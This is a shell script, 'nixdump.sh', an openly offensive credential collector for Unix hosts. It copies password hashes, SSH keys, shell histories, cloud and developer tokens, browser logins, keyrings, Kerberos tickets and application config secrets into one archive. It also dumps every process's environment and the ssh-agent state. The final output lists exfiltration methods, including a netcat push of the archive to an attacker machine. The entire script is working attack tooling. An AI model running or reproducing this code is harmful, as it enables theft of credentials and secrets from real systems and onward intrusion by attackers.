#!/bin/sh
# nixdump.sh - dependency-free raw credential collector.
#
# Runs on ANY unix host (pure POSIX sh + coreutils/find/tar - no python, no
# john, no internet needed). It copies every raw credential artifact it can
# read into ONE archive, preserving paths, plus a meta/ report for things that
# are not files (process env, ssh-agent, logged-in users). You then pull the
# archive to Kali and run:  python3 nixdump.py --offline <archive>
#
# Collect everything raw here; parse/crack/decrypt offline where the tools are.
# As always: you only get what your current privileges can read (root = all).

set -u
UMASK_OLD=$(umask); umask 077

HOST=$(hostname 2>/dev/null || echo unknown)
STAMP=$(date +%Y%m%d-%H%M%S 2>/dev/null || echo now)
STAGE="${TMPDIR:-/tmp}/.nixdump-$$"
ROOT="$STAGE/root"
META="$STAGE/meta"
OUT="${TMPDIR:-/tmp}/nixdump-${HOST}-${STAMP}.tar.gz"
MAXSZ=52428800          # skip single files larger than 50MB (keep bundle small)

mkdir -p "$ROOT" "$META" 2>/dev/null || { echo "[!] cannot create staging dir"; exit 1; }

log() { echo "[*] $1"; }

# copy one file into the staging tree at its original path
cp_one() {
    src="$1"
    [ -f "$src" ] || return 0
    [ -r "$src" ] || return 0
    sz=$(wc -c < "$src" 2>/dev/null || echo 0)
    [ "$sz" -gt "$MAXSZ" ] 2>/dev/null && return 0
    dst="$ROOT$src"
    dir=$(dirname "$dst")
    mkdir -p "$dir" 2>/dev/null || return 0
    cp "$src" "$dst" 2>/dev/null
}

# copy every file (recursively) under a dir
cp_dir() {
    [ -d "$1" ] || return 0
    find "$1" -type f 2>/dev/null | while IFS= read -r f; do cp_one "$f"; done
}

# copy files found by name pattern under given roots (find -iname)
cp_find() {
    pat="$1"; shift
    for r in "$@"; do
        [ -d "$r" ] || continue
        find "$r" -xdev -type f -iname "$pat" 2>/dev/null | \
            while IFS= read -r f; do cp_one "$f"; done
    done
}

# ---- list of home dirs (from /etc/passwd + /home + /root) -----------------
HOMES=$(
    { awk -F: '$6 ~ /^\// {print $6}' /etc/passwd 2>/dev/null
      ls -d /home/* /root 2>/dev/null
    } | sort -u
)

log "staging in $STAGE"

# ================= SYSTEM =================
for f in /etc/shadow /etc/passwd /etc/gshadow /etc/sudoers \
         /etc/mysql/debian.cnf /etc/my.cnf /etc/krb5.conf /etc/krb5.keytab; do
    cp_one "$f"
done
cp_dir /etc/sudoers.d
# SSSD cached domain hashes (binary ldb -> parsed offline)
cp_dir /var/lib/sss/db
cp_dir /var/lib/sss/secrets

# ================= NETWORK =================
cp_dir /etc/NetworkManager/system-connections
cp_dir /etc/wireguard
cp_find "*.conf"  /etc/openvpn
cp_find "*.ovpn"  /etc/openvpn /root /home
cp_find "auth*.txt" /etc/openvpn
# fstab + any cifs credential files it references
cp_one /etc/fstab
if [ -r /etc/fstab ]; then
    grep -o 'credentials=[^ ,]*' /etc/fstab 2>/dev/null | cut -d= -f2 | \
        while IFS= read -r cf; do cp_one "$cf"; done
fi

# ================= WEB / DB / APP CONFIGS (walk) =================
WEBROOTS="/var/www /srv /opt /usr/share/nginx /usr/local/www /var/lib /etc"
for pat in "wp-config.php" "config.php" "config.inc.php" "configuration.php" \
           "settings.php" "local_settings.py" "settings.py" "database.php" \
           "db.php" ".env" "*.env" "appsettings*.json" "application.properties" \
           "application.y*ml" "config.y*ml" "secrets.y*ml" "credentials" \
           "credentials.xml" "master.key" "hudson.util.Secret" \
           "tomcat-users.xml" "standalone.xml" "context.xml" "server.xml" \
           "web.config" "docker-compose.y*ml" "*.kdbx" "*.kdb"; do
    cp_find "$pat" $WEBROOTS $HOMES
done

# ================= PER-HOME USER STORES =================
for h in $HOMES; do
    [ -d "$h" ] || continue
    # ssh
    cp_dir "$h/.ssh"
    # shell / client histories
    for hist in .bash_history .zsh_history .sh_history .ash_history \
                .python_history .mysql_history .psql_history \
                .rediscli_history .node_repl_history .lesshst; do
        cp_one "$h/$hist"
    done
    cp_one "$h/.local/share/fish/fish_history"
    # cloud / cli / dev creds
    for c in .aws/credentials .aws/config .azure/accessTokens.json \
             .azure/azureProfile.json .config/gcloud/credentials.db \
             .config/gcloud/application_default_credentials.json \
             .kube/config .docker/config.json .git-credentials .netrc \
             .pypirc .npmrc .s3cfg .config/rclone/rclone.conf \
             .config/gh/hosts.yml .terraform.d/credentials.tfrc.json \
             .config/filezilla/sitemanager.xml .my.cnf .pgpass; do
        cp_one "$h/$c"
    done
    cp_dir "$h/.config/gcloud/legacy_credentials"
    # secret stores (binary -> offline)
    cp_dir "$h/.gnupg"
    cp_dir "$h/.local/share/keyrings"
    cp_dir "$h/.kde/share/apps/kwallet"
    cp_dir "$h/.local/share/kwalletd"
    cp_dir "$h/.password-store"
    # firefox / thunderbird profiles (logins + key db only)
    for b in .mozilla/firefox .thunderbird; do
        [ -d "$h/$b" ] || continue
        for f in logins.json key4.db key3.db signons.sqlite; do
            find "$h/$b" -maxdepth 2 -name "$f" 2>/dev/null | \
                while IFS= read -r ff; do cp_one "$ff"; done
        done
    done
done

# ================= KERBEROS TICKETS / KEYTABS =================
cp_find "krb5cc_*" /tmp /var/tmp /run
cp_find "*.keytab" /etc /opt /home /root /var

# ================= META: PROCESS ENV + CMDLINE (not files) =================
{
    for p in /proc/[0-9]*; do
        pid=${p#/proc/}
        comm=$(cat "$p/comm" 2>/dev/null)
        env=$(tr '\0' '\n' < "$p/environ" 2>/dev/null)
        cmd=$(tr '\0' ' '  < "$p/cmdline" 2>/dev/null)
        [ -n "$env$cmd" ] || continue
        echo "=== PID $pid ($comm) ==="
        [ -n "$cmd" ] && echo "CMDLINE: $cmd"
        if [ -n "$env" ]; then
            echo "ENVIRON:"
            echo "$env"
        fi
    done
} > "$META/proc.txt" 2>/dev/null

# ================= META: SSH-AGENT + LOGGED-IN USERS =================
{
    echo "## SSH_AUTH_SOCK (current session)"
    echo "${SSH_AUTH_SOCK:-<unset>}"
    echo
    echo "## agent sockets on disk (owner = whose agent)"
    ls -la /tmp/ssh-*/agent.* 2>/dev/null
    find /tmp -maxdepth 2 -name 'agent.*' -type s 2>/dev/null
    echo
    echo "## keys loaded in CURRENT user's agent (ssh-add -l)"
    ssh-add -l 2>/dev/null || echo "<none / no agent / ssh-add missing>"
    echo
    echo "## logged-in users and WHERE they came from (source IP)"
    who 2>/dev/null
    w  2>/dev/null
    echo
    echo "## established inbound ssh connections (source IPs)"
    (ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null) | grep -E ':22\b' 2>/dev/null
} > "$META/ssh_agent.txt" 2>/dev/null

# ================= META: MANIFEST =================
{
    echo "host: $HOST"
    echo "date: $(date 2>/dev/null)"
    echo "id: $(id 2>/dev/null)"
    echo "uname: $(uname -a 2>/dev/null)"
    echo "euid_root: $([ "$(id -u 2>/dev/null)" = 0 ] && echo yes || echo no)"
} > "$META/manifest.txt" 2>/dev/null

# ================= PACK =================
if command -v tar >/dev/null 2>&1; then
    if tar czf "$OUT" -C "$STAGE" . 2>/dev/null; then
        :
    else
        OUT="${OUT%.gz}"
        tar cf "$OUT" -C "$STAGE" . 2>/dev/null
    fi
else
    echo "[!] tar not found - staging left at $STAGE (copy it manually)"
    umask "$UMASK_OLD"
    exit 0
fi

rm -rf "$STAGE" 2>/dev/null
umask "$UMASK_OLD"
BN=$(basename "$OUT")
log "done -> $OUT"
cat <<EOF

[*] EXFIL (pick one), then on kali:  python3 nixdump.py --offline $BN --crack --json

  A) http pull   target: python3 -m http.server 8001
                 kali:   wget http://<TARGET_OR_240.0.0.1>:8001/$BN

  B) base64      target: base64 -w0 $OUT ; echo
                 kali:   echo '<PASTE>' | base64 -d > $BN

  C) nc push     kali:   nc -lvnp 4445 > $BN
                 target: nc <KALI_IP> 4445 < $OUT
EOF
